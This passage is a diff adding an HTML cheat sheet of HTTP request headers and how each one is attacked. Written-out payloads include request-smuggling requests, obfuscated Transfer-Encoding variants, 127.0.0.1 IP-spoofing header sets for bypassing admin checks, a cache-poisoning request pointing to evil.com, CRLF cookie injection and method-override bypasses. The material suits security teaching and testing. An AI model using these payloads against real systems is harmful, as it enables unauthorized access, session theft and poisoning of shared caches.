+      </div>
+
+      <!-- COOKIE -->
+      <div class="header-card hc-critical" id="cookie" data-severity="critical">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Cookie <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-critical">Critical</span>
+            <span class="badge badge-info">Session Hijacking</span>
+            <span class="badge badge-info">CSRF</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>The <code>Cookie</code> request header sends all cookies the browser has stored for this domain back to the server. It is the primary mechanism for session management. Typically contains a session ID that maps to server-side state.</p>
+              <div class="code-block">
+<span class="header-name">Cookie:</span> <span class="header-value">session=abc123; csrf_token=xyz789; pref=dark</span>
+
+<span class="comment"># Multiple cookies separated by '; ' (semicolon-space)</span>
+<span class="comment"># Sent automatically by browser — attacker goal: steal these</span>
+              </div>
+              <p>Session cookies are the crown jewel for attackers. Stealing one = full account takeover without knowing password.</p>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack Vectors</div>
+              <ul>
+                <li><strong>XSS cookie theft</strong> — <code>document.cookie</code> exfiltration (bypassed by HttpOnly)</li>
+                <li><strong>Network sniffing</strong> — HTTP (no TLS) = plaintext cookie exposure</li>
+                <li><strong>Session fixation</strong> — set victim's session ID before they authenticate</li>
+                <li><strong>Session prediction</strong> — guessing sequential or weak session IDs</li>
+                <li><strong>CSRF</strong> — browser auto-sends cookies on cross-origin requests</li>
+                <li><strong>Subdomain cookie theft</strong> — subdomain XSS steals parent domain cookies</li>
+              </ul>
+              <div class="attack-scenario">
+                <div class="attack-scenario-title">💀 Cookie Injection via CRLF</div>
+                <p>If a parameter is reflected into a Set-Cookie header, injecting <code>%0d%0aSet-Cookie: session=evil</code> adds a new cookie. This is CRLF injection → cookie poisoning.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- CONTENT-LENGTH -->
+      <div class="header-card hc-critical" id="content-length" data-severity="critical">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Content-Length <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-critical">Critical</span>
+            <span class="badge badge-info">HTTP Smuggling</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Specifies the <strong>exact byte size</strong> of the request body. The server reads exactly this many bytes and considers the rest to be the next request. When this disagrees with Transfer-Encoding, you get HTTP Request Smuggling — one of the most powerful modern web vulnerabilities.</p>
+              <div class="code-block">
+<span class="header-name">POST</span> /data HTTP/1.1
+<span class="header-name">Host:</span> <span class="header-value">target.com</span>
+<span class="header-name">Content-Length:</span> <span class="header-value">13</span>
+
+<span class="header-value">Hello, World!</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">HTTP Request Smuggling (CL.TE)</div>
+              <p>Front-end uses Content-Length. Back-end uses Transfer-Encoding. The leftover body bytes become the start of the next parsed request:</p>
+              <div class="code-block">
+<span class="header-name">POST</span> / HTTP/1.1
+<span class="header-name">Content-Length:</span> <span class="attack">49</span>
+<span class="header-name">Transfer-Encoding:</span> <span class="attack">chunked</span>
+
+<span class="attack">e</span>
+<span class="header-value">q=smuggled&x=</span>
+<span class="attack">0</span>
+
+<span class="attack">GET /admin HTTP/1.1
+Host: internal</span>
+              </div>
+              <p>Back-end sees the chunked body end at <code>0</code>, then reads the next "request" — which is your smuggled <code>GET /admin</code>.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- TRANSFER-ENCODING -->
+      <div class="header-card hc-critical" id="transfer-encoding" data-severity="critical">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Transfer-Encoding <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-critical">Critical</span>
+            <span class="badge badge-info">TE.CL Smuggling</span>
+            <span class="badge badge-info">TE.TE Smuggling</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p><code>Transfer-Encoding: chunked</code> means the body is sent in size-prefixed chunks, ending with a zero-length chunk (<code>0\r\n\r\n</code>). This is the other side of the Content-Length coin — and the engine behind HTTP Request Smuggling.</p>
+              <div class="code-block">
+<span class="comment"># Chunked body format:</span>
+<span class="header-value">5</span><span class="comment">     ← chunk size in hex</span>
+<span class="header-value">Hello</span>
+<span class="header-value">6</span>
+<span class="header-value"> World</span>
+<span class="header-value">0</span><span class="comment">     ← terminating chunk</span>
+
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">TE.TE Smuggling — Obfuscation</div>
+              <p>Both servers use TE but you obfuscate it so one ignores it:</p>
+              <div class="code-block">
+<span class="comment"># Obfuscated TE to confuse one server:</span>
+<span class="header-name">Transfer-Encoding:</span> <span class="attack">xchunked</span>
+<span class="header-name">Transfer-Encoding:</span> <span class="attack">x</span>
+<span class="header-name">Transfer-Encoding:</span> <span class="attack">chunked, </span><span class="comment">← trailing space</span>
+<span class="header-name">Transfer-Encoding:</span>
+  <span class="attack">chunked</span><span class="comment"> ← tab-indented</span>
+<span class="header-name">Transfer-Encoding</span><span class="attack">:</span> <span class="attack">chunked</span>
+<span class="header-name">X: X[\n]Transfer-Encoding:</span> <span class="attack">chunked</span>
+              </div>
+              <p>One server sees a valid TE, processes it. The other sees garbage TE, falls back to CL. Desync achieved.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- X-FORWARDED-FOR -->
+      <div class="header-card hc-high" id="xff" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">X-Forwarded-For <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-info">IP Spoofing</span>
+            <span class="badge badge-info">Rate Limit Bypass</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Added by proxies/load balancers to pass the original client IP to the backend. Format is a comma-separated list of IPs — each proxy appends its own.</p>
+              <div class="code-block">
+<span class="header-name">X-Forwarded-For:</span> <span class="header-value">203.0.113.1, 198.51.100.2</span>
+<span class="comment"># First IP = original client
+# Subsequent IPs = proxies in chain</span>
+
+<span class="comment"># Related headers doing the same thing:</span>
+<span class="header-name">X-Real-IP:</span> <span class="header-value">203.0.113.1</span>
+<span class="header-name">True-Client-IP:</span> <span class="header-value">203.0.113.1</span>
+<span class="header-name">CF-Connecting-IP:</span> <span class="header-value">203.0.113.1</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack Vectors</div>
+              <ul>
+                <li><strong>IP whitelist bypass</strong> — add <code>X-Forwarded-For: 127.0.0.1</code> to appear as localhost and access admin panels</li>
+                <li><strong>Rate limit bypass</strong> — change IP per request to evade per-IP rate limits</li>
+                <li><strong>Geo-restriction bypass</strong> — spoof a whitelisted country's IP</li>
+                <li><strong>Log poisoning</strong> — inject payloads into XFF that end up in logs</li>
+              </ul>
+              <div class="code-block">
+<span class="comment"># Bypass "admin from localhost only" check:</span>
+<span class="header-name">X-Forwarded-For:</span> <span class="attack">127.0.0.1</span>
+<span class="header-name">X-Real-IP:</span> <span class="attack">127.0.0.1</span>
+<span class="header-name">X-Originating-IP:</span> <span class="attack">127.0.0.1</span>
+<span class="header-name">X-Remote-IP:</span> <span class="attack">127.0.0.1</span>
+<span class="header-name">X-Client-IP:</span> <span class="attack">127.0.0.1</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- X-FORWARDED-HOST -->
+      <div class="header-card hc-critical" id="x-forwarded-host" data-severity="critical">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">X-Forwarded-Host <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-critical">Critical</span>
+            <span class="badge badge-info">Cache Poisoning</span>
+            <span class="badge badge-info">Password Reset</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Like <code>X-Forwarded-For</code> but for the Host header. When a load balancer rewrites the <code>Host</code> header, it stashes the original in <code>X-Forwarded-Host</code>. Many applications use this to build absolute URLs — making it a perfect injection point if not validated.</p>
+              <div class="code-block">
+<span class="header-name">X-Forwarded-Host:</span> <span class="header-value">original-host.com</span>
+
+<span class="comment"># Also look for these aliases:</span>
+<span class="header-name">X-Host:</span> <span class="header-value">...</span>
+<span class="header-name">X-Forwarded-Server:</span> <span class="header-value">...</span>
+<span class="header-name">X-HTTP-Host-Override:</span> <span class="header-value">...</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Cache Poisoning Attack</div>
+              <div class="attack-scenario">
+                <div class="attack-scenario-title">💀 Web Cache Poisoning via X-Forwarded-Host</div>
+                <p>The app returns a cached response that includes a URL built from X-Forwarded-Host. Inject evil.com → cached response now points everyone to your server. Works even without XSS if JS src is built dynamically.</p>
+              </div>
+              <div class="code-block">
+<span class="header-name">GET</span> / HTTP/1.1
+<span class="header-name">Host:</span> <span class="header-value">legitimate.com</span>
+<span class="header-name">X-Forwarded-Host:</span> <span class="attack">evil.com</span>
+
+<span class="comment"># Response gets cached:
+# &lt;script src="https://evil.com/app.js"&gt;&lt;/script&gt;
+# Every user who hits cache gets XSS'd</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- REFERER -->
+      <div class="header-card hc-high" id="referer" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Referer <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-info">Data Leakage</span>
+            <span class="badge badge-info">CSRF Bypass</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Tells the server the URL of the page that made this request. <em>(Note: it's intentionally misspelled — "referrer" has two r's but the HTTP spec says "referer")</em>. Sent automatically by browsers on navigation, form submission, and resource loading.</p>
+              <div class="code-block">
+<span class="header-name">Referer:</span> <span class="header-value">https://bank.com/account?token=secret123</span>
+<span class="comment"># If the URL contains sensitive data,
+# it leaks to every external resource on the page
+# (analytics scripts, CDNs, ads)</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack Vectors</div>
+              <ul>
+                <li><strong>Token leakage</strong> — password reset tokens in URLs leak via Referer to third-party scripts</li>
+                <li><strong>Sensitive data exposure</strong> — search terms, user IDs, internal paths in Referer logs</li>
+                <li><strong>Referer-based CSRF protection bypass</strong> — some apps check Referer for CSRF protection. Bypass: send no Referer (null), or manipulate the URL structure</li>
+                <li><strong>SSRF via Referer</strong> — some servers fetch the Referer URL for preview generation</li>
+              </ul>
+              <div class="code-block">
+<span class="comment"># Referer CSRF check bypass methods:</span>
+
+<span class="comment"># 1. Remove Referer header entirely</span>
+<span class="comment"># 2. Use &lt;meta name="referrer" content="no-referrer"&gt;</span>
+<span class="comment"># 3. Spoof with: Referer: https://target.com.evil.com/</span>
+<span class="comment"># 4. Use data: URI — sends no Referer</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ORIGIN -->
+      <div class="header-card hc-high" id="origin" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Origin <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-info">CORS Bypass</span>
+            <span class="badge badge-info">CSRF</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Similar to Referer but only contains the <strong>scheme + domain + port</strong> — no path, no query. Sent on: cross-origin requests, CORS preflight, POST forms. This is what the server checks to enforce CORS policy.</p>
+              <div class="code-block">
+<span class="comment"># Referer vs Origin comparison:</span>
+<span class="header-name">Referer:</span> <span class="header-value">https://app.com/page?q=secret</span>
+<span class="header-name">Origin:</span>  <span class="header-value">https://app.com</span>
+<span class="comment"># Origin = no path, no query, more private</span>
+
+<span class="comment"># "null" origin — sent from:</span>
+<span class="comment"># - sandboxed iframes</span>
+<span class="comment"># - data: URI pages</span>
+<span class="comment"># - file:// pages</span>
+<span class="header-name">Origin:</span> <span class="header-value">null</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">CORS / CSRF Attack</div>
+              <ul>
+                <li><strong>CORS misconfiguration test</strong> — send Origin: evil.com, see if Access-Control-Allow-Origin: evil.com comes back</li>
+                <li><strong>Null origin bypass</strong> — if server allows null origin, use a sandboxed iframe to make requests with Origin: null</li>
+                <li><strong>Subdomain bypass</strong> — if *.target.com trusted, find an XSS on any subdomain</li>
+                <li><strong>Origin reflection</strong> — server reflects whatever Origin you send → CORS theft possible</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- CONTENT-TYPE -->
+      <div class="header-card hc-high" id="content-type" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Content-Type <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-info">CSRF Bypass</span>
+            <span class="badge badge-info">Upload Bypass</span>
+            <span class="badge badge-info">XXE</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Tells the server what format the request body is in. The server uses this to parse the body correctly. Common values:</p>
+              <div class="code-block">
+<span class="header-name">Content-Type:</span> <span class="header-value">application/json</span>
+<span class="header-name">Content-Type:</span> <span class="header-value">application/x-www-form-urlencoded</span>
+<span class="header-name">Content-Type:</span> <span class="header-value">multipart/form-data; boundary=----xyz</span>
+<span class="header-name">Content-Type:</span> <span class="header-value">application/xml</span>
+<span class="header-name">Content-Type:</span> <span class="header-value">text/xml</span>
+<span class="header-name">Content-Type:</span> <span class="header-value">application/x-www-form-urlencoded</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack Vectors</div>
+              <ul>
+                <li><strong>CORS preflight bypass</strong> — "simple" content types (text/plain, form-urlencoded) skip CORS preflight → JSON CSRF possible</li>
+                <li><strong>XXE via Content-Type</strong> — change application/json to application/xml, submit XML with entity declaration</li>
+                <li><strong>File upload MIME bypass</strong> — change image/jpeg to application/x-php to trick upload filter</li>
+                <li><strong>Parser confusion</strong> — submit JSON as form-encoded — server may parse differently than expected</li>
+              </ul>
+              <div class="attack-scenario">
+                <div class="attack-scenario-title">💀 JSON CSRF via Content-Type</div>
+                <p>API requires JSON. Change Content-Type to text/plain — browser sends this without preflight. Server might still parse the body as JSON if it ignores Content-Type. CSRF without preflight = win.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- USER-AGENT -->
+      <div class="header-card hc-medium" id="user-agent" data-severity="medium">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">User-Agent <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-medium">Medium</span>
+            <span class="badge badge-info">WAF Bypass</span>
+            <span class="badge badge-info">Fingerprinting</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Identifies the client software making the request. Contains browser name, version, OS, rendering engine. Sent automatically by browsers; can be set to anything by tools like curl/Burp.</p>
+              <div class="code-block">
+<span class="comment"># Browser UA:</span>
+<span class="header-name">User-Agent:</span> <span class="header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0</span>
+
+<span class="comment"># Scanner tell:</span>
+<span class="header-name">User-Agent:</span> <span class="header-value">sqlmap/1.7.8#stable (https://sqlmap.org)</span>
+<span class="header-name">User-Agent:</span> <span class="header-value">Nikto/2.1.6</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack Vectors</div>
+              <ul>
+                <li><strong>WAF bypass</strong> — some WAFs skip inspection for Googlebot UA. Spoof it: <code>Googlebot/2.1</code></li>
+                <li><strong>Different content served</strong> — mobile UA may get different JS with fewer security controls</li>
+                <li><strong>UA-based SQLi</strong> — if UA is logged to DB, it's an injection point</li>
+                <li><strong>Scan detection evasion</strong> — always change tool UA to a real browser string</li>
+                <li><strong>SSRF via UA</strong> — rare but some apps fetch URLs found in UA strings</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- X-HTTP-METHOD-OVERRIDE -->
+      <div class="header-card hc-high" id="x-method-override" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">X-HTTP-Method-Override <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-info">Access Control Bypass</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Allows tunneling HTTP methods through POST. Originally for old browsers/firewalls that only allow GET/POST. The server may treat a POST as if it were the method specified in this header.</p>
+              <div class="code-block">
+<span class="header-name">POST</span> /api/users/5 HTTP/1.1
+<span class="header-name">X-HTTP-Method-Override:</span> <span class="attack">DELETE</span>
+<span class="comment"># Server processes this as DELETE /api/users/5
+# Bypasses firewall rules blocking DELETE</span>
+
+<span class="comment"># Also try these aliases:</span>
+<span class="header-name">X-Method-Override:</span> <span class="attack">DELETE</span>
+<span class="header-name">X-HTTP-Method:</span> <span class="attack">PUT</span>
+<span class="header-name">_method:</span> <span class="attack">PATCH</span> <span class="comment">← form field</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Access Control Bypass</div>
+              <div class="attack-scenario">
+                <div class="attack-scenario-title">💀 Method-Based Access Control Bypass</div>
+                <p>App blocks DELETE /admin/users/5 for non-admins. But allows POST from any user. Add X-HTTP-Method-Override: DELETE to your POST → backend processes it as DELETE, bypassing the method-based ACL check.</p>
+              </div>
+              <ul>
+                <li>Try on every endpoint that has method restrictions</li>
+                <li>Also try as URL parameter: <code>?_method=DELETE</code></li>
+                <li>Test PATCH as POST override to modify resources you shouldn't</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SEC-FETCH -->
+      <div class="header-card hc-medium" id="sec-fetch" data-severity="medium">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Sec-Fetch-* Headers <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-medium">Medium</span>
+            <span class="badge badge-info">Fetch Metadata</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What They Are</div>
+              <p>Modern browser security headers that provide context about WHY a request is being made. Part of the Fetch Metadata spec. Cannot be set by JavaScript — browser-controlled only.</p>
+              <div class="code-block">
+<span class="header-name">Sec-Fetch-Site:</span> <span class="header-value">same-origin</span> <span class="comment">| cross-site | same-site | none</span>
+<span class="header-name">Sec-Fetch-Mode:</span> <span class="header-value">navigate</span> <span class="comment">| cors | no-cors | websocket</span>
+<span class="header-name">Sec-Fetch-Dest:</span> <span class="header-value">document</span> <span class="comment">| script | image | empty | ...</span>
+<span class="header-name">Sec-Fetch-User:</span> <span class="header-value">?1</span> <span class="comment">← user-initiated navigation</span>
+
+<span class="comment"># CSRF request from evil.com has:
+# Sec-Fetch-Site: cross-site
+# Server can block it at this point</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Bypass Angle</div>
+              <ul>
+                <li><strong>Missing validation</strong> — most apps don't validate these. Check if they're even read.</li>
+                <li><strong>Curl/tools don't send them</strong> — server-side defenses based only on these can be bypassed from non-browser clients</li>
+                <li><strong>Sec-Fetch-Site: none</strong> — direct navigation, can bypass some CSRF checks</li>
+                <li>If site uses these for CSRF protection: replay in curl without headers → direct access</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ACCEPT-ENCODING -->
+      <div class="header-card hc-medium" id="accept-encoding" data-severity="medium">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Accept-Encoding <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-medium">Medium</span>
+            <span class="badge badge-info">BREACH Attack</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Tells the server which compression algorithms the client supports.</p>
+              <div class="code-block">
+<span class="header-name">Accept-Encoding:</span> <span class="header-value">gzip, deflate, br, zstd</span>
+<span class="comment"># br = Brotli (modern)
+# gzip = classic
+# deflate = DEFLATE (zlib)</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">BREACH Attack</div>
+              <div class="attack-scenario">
+                <div class="attack-scenario-title">💀 BREACH (Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext)</div>
+                <p>If: HTTPS + gzip + secret reflected in response body + attacker can inject into request → compression oracle. Attacker measures response size changes to extract secrets 1 byte at a time. Killed by removing compression or using per-request secrets.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ACCEPT -->
+      <div class="header-card hc-low" id="accept" data-severity="low">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Accept <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-low">Low</span>
+            <span class="badge badge-info">Content Negotiation</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Tells the server which content types the client can handle. Server should respond with a matching Content-Type.</p>
+              <div class="code-block">
+<span class="header-name">Accept:</span> <span class="header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="comment"># q= is quality factor, 0-1 preference weight</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Security Angle</div>
+              <ul>
+                <li><strong>Content negotiation abuse</strong> — change Accept to application/json to get JSON response revealing more data than HTML view</li>
+                <li><strong>Different code paths</strong> — XML responses may be processed differently, enabling XXE</li>
+                <li>Try: <code>Accept: application/xml</code> on JSON endpoints to trigger XML parsing</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- UPGRADE -->
+      <div class="header-card hc-high" id="upgrade" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Upgrade / Connection <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-info">WebSocket Hijack</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Used to upgrade from HTTP/1.1 to WebSocket. The full WebSocket handshake:</p>
+              <div class="code-block">
+<span class="header-name">GET</span> /chat HTTP/1.1
+<span class="header-name">Host:</span> <span class="header-value">target.com</span>
+<span class="header-name">Upgrade:</span> <span class="header-value">websocket</span>
+<span class="header-name">Connection:</span> <span class="header-value">Upgrade</span>
+<span class="header-name">Sec-WebSocket-Key:</span> <span class="header-value">dGhlIHNhbXBsZSBub25jZQ==</span>
+<span class="header-name">Sec-WebSocket-Version:</span> <span class="header-value">13</span>
+<span class="header-name">Origin:</span> <span class="header-value">https://target.com</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">WebSocket Hijacking</div>
+              <div class="attack-scenario">
+                <div class="attack-scenario-title">💀 Cross-Site WebSocket Hijacking</div>
+                <p>WebSocket handshake has no CSRF token. If the server only validates Origin — and you can spoof or if Origin isn't checked — you can make a victim's browser open a WebSocket to the target and relay messages to you. Full account compromise if chat/live data contains sensitive info.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- RANGE -->
+      <div class="header-card hc-medium" id="range" data-severity="medium">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Range <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-medium">Medium</span>
+            <span class="badge badge-info">DoS via Byte Range</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Requests only part of a resource. Server responds with 206 Partial Content. Used for resumable downloads, video streaming.</p>
+              <div class="code-block">
+<span class="header-name">Range:</span> <span class="header-value">bytes=0-1023</span>    <span class="comment">← first 1024 bytes</span>
+<span class="header-name">Range:</span> <span class="header-value">bytes=-500</span>     <span class="comment">← last 500 bytes</span>
+<span class="header-name">Range:</span> <span class="header-value">bytes=9500-</span>    <span class="comment">← from byte 9500 to end</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack Vectors</div>
+              <ul>
+                <li><strong>Range DoS (RUDY variant)</strong> — request Range: bytes=0-0 for a massive file, repeatedly → resource exhaustion</li>
+                <li><strong>Overlapping ranges</strong> — <code>Range: bytes=0-1, 0-2, 0-3, ...</code> — Apache "killer" attack</li>
+                <li><strong>Reading partial file content</strong> — if file exposure exists, use Range to exfiltrate in chunks</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- FORWARDED -->
+      <div class="header-card hc-high" id="forwarded" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Forwarded <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-info">RFC 7239 — IP Spoof</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>The standardized (RFC 7239) version of X-Forwarded-For. Combines multiple forwarding headers into one. Less common in practice but some frameworks use it.</p>
+              <div class="code-block">
+<span class="header-name">Forwarded:</span> <span class="header-value">for=203.0.113.1;proto=https;host=example.com</span>
+<span class="header-name">Forwarded:</span> <span class="header-value">for=192.0.2.1, for=203.0.113.1</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack Vector</div>
+              <p>Same as XFF — spoof the <code>for=</code> value to bypass IP-based controls. Try all IP header variants simultaneously since you don't know which one the backend reads.</p>
+              <div class="code-block">
+<span class="header-name">X-Forwarded-For:</span> <span class="attack">127.0.0.1</span>
+<span class="header-name">X-Real-IP:</span> <span class="attack">127.0.0.1</span>
+<span class="header-name">Forwarded:</span> <span class="attack">for=127.0.0.1</span>
+<span class="header-name">X-Client-IP:</span> <span class="attack">127.0.0.1</span>
+<span class="header-name">True-Client-IP:</span> <span class="attack">127.0.0.1</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- IF-MODIFIED-SINCE -->
+      <div class="header-card hc-low" id="if-modified" data-severity="low">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">If-Modified-Since / If-None-Match <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-low">Low</span>
+            <span class="badge badge-info">Cache Timing</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What They Are</div>
+              <p>Conditional request headers for caching. Browser sends these to ask "has this changed since I last got it?" If unchanged, server returns 304 Not Modified (no body, saving bandwidth).</p>
+              <div class="code-block">
+<span class="header-name">If-Modified-Since:</span> <span class="header-value">Wed, 21 Oct 2024 07:28:00 GMT</span>
+<span class="header-name">If-None-Match:</span> <span class="header-value">"etag-value-abc123"</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Security Angle</div>
+              <ul>
+                <li><strong>ETag as fingerprint</strong> — ETag can leak inode numbers on Apache (fixed in newer versions) — server fingerprinting</li>
+                <li><strong>Timing oracle</strong> — 304 vs 200 response time difference can indicate content staleness</li>
+                <li><strong>Cache control bypass</strong> — force fresh response by removing these headers</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- CACHE-CONTROL REQ -->
+      <div class="header-card hc-medium" id="cache-control-req" data-severity="medium">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Cache-Control (Request) <span class="direction">REQ</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-medium">Medium</span>
+            <span class="badge badge-info">Cache Bypass</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
